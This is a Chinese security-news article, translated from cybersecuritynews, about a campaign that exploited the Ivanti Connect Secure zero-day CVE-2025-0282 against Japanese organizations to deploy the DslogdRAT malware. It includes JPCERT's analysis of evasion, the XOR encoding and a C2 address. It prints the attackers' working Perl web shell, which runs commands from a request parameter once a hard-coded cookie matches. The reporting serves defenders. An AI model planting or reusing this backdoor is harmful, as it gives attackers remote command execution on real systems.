---
title: 零日漏洞引发危机：黑客利用 Ivanti VPN 发动 DslogdRAT 恶意攻击
url: https://www.anquanke.com/post/id/306877
source: 安全客-有思想的安全新媒体
date: 2025-04-26
fetch_date: 2025-10-06T22:04:01.441396
---

# 零日漏洞引发危机：黑客利用 Ivanti VPN 发动 DslogdRAT 恶意攻击

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 零日漏洞引发危机：黑客利用 Ivanti VPN 发动 DslogdRAT 恶意攻击

阅读量**96547**

发布时间 : 2025-04-25 10:49:24

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/hackers-exploited-ivanti-connect-secure-0-day/>

译文仅供参考，具体内容表达以及含义原文为准。

近期针对日本组织的攻击事件表明，有技术高超的黑客利用了 Ivanti Connect Secure VPN 设备中的一个零日漏洞。

这些攻击大约发生在 2024 年 12 月左右，攻击者利用 CVE-2025-0282 漏洞部署了多种恶意工具，其中包括一种名为 DslogdRAT 的定制恶意软件以及一个精心制作的网页后门。

这些工具使攻击者能够持续访问被攻陷的系统，并远程执行任意命令。

威胁行为者通过将零日漏洞利用与定制恶意软件部署技术相结合，展示出了高超的攻击能力。

在攻陷 VPN 设备后，攻击者安装了一个基于 Perl 语言的网页后门，以此作为初始立足点，进而能够部署包括 DslogdRAT 在内的更多恶意软件组件。

这种多阶段的攻击方式显示出攻击者在针对安全网络基础设施时经过了有条不紊的策划，且具备较高的技术水平。

JPCERT 的分析师发现，DslogdRAT 恶意软件设计有特定的逃避检测功能，特别是它仅在上午 8 点到晚上 8 点的工作时间内运行。

这种经过精心算计的攻击方式帮助攻击者将恶意流量与合法的业务操作相融合，在保持对被攻陷环境持续访问的同时，大幅降低了被检测到的可能性。

除了 DslogdRAT，研究人员还在同样被攻陷的系统中发现了另一种名为 SPAWNSNARE 的恶意软件变种，这表明这是一次经过协同且资源充足的攻击行动。

Google 和 CISA 此前在 2025 年 4 月都曾报告过类似的攻击活动，这表明针对 Ivanti 产品的攻击仍在持续。

安全专家警告称，这些攻击代表着一种持续存在的威胁，Ivanti Connect Secure 产品依然是高价值的攻击目标。

该供应商最近已修复了另一个严重漏洞（CVE-2025-22457），但相关组织仍被敦促保持警惕，因为预计攻击还会继续。

****DslogdRAT 的技术分析****

DslogdRAT 采用了一种复杂的执行流程，旨在逃避检测机制。在执行时，该恶意软件的主进程会在立即终止自身之前创建一个子进程。

随后，第一个子进程会对经过异或（XOR）加密的配置数据进行解码（使用 0x63 作为密钥），并生成包含核心功能的第二个子进程。

这种进程隔离技术有助于绕过那些监控单进程行为，或者在父进程结束时就会终止检测的安全解决方案。

攻击者最初是通过部署在 “/home/webserver/htdocs/dana-na/cc/ccupdate.cgi” 的一个看似简单但却有效的基于 Perl 语言的网页后门获得访问权限的。

这个 Web Shell 代码揭示了攻击者是如何建立初始立足点的：

use CGI; my $cookie\_str = $ENV{HTTP\_COOKIE};

if($cookie\_str =~ /DSAUTOKEN=([^;]+)/) {

if($1 eq ‘af95380019083db5’) {

print CGI:: header( -type => ‘text/html’ );

my $data = CGI::param(‘data’);

system($data);

exit(0);

}

}

这段代码允许攻击者只需发送带有特定 cookie 值 “DSAUTOKEN=af95380019083db5” 的 HTTP 请求，并在 “data” 参数中包含要运行的命令，就可以执行任意命令。

这个后门的简单性凸显了这样一个事实：即使是简单的代码，在被部署到关键基础设施中时，也可能造成严重的安全漏洞。

DslogdRAT 与其命令控制服务器（3.112.192.119:443）之间的通信使用了一种定制的编码机制。

所交换的数据会使用一种简单的异或操作进行混淆处理，该操作会以 7 字节为一块，按照轮换模式应用从 0x01 到 0x07 的密钥。

这种技术虽然不是非常复杂，但足以提供足够的混淆效果，以避免基本的网络流量分析，同时支持包括文件传输、Shell 命令执行和代理功能在内的多种命令功能。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/hackers-exploited-ivanti-connect-secure-0-day/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306877](/post/id/306877)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/hackers-exploited-ivanti-connect-secure-0-day/)

如若转载,请注明出处： <https://cybersecuritynews.com/hackers-exploited-ivanti-connect-secure-0-day/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**4赞

收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)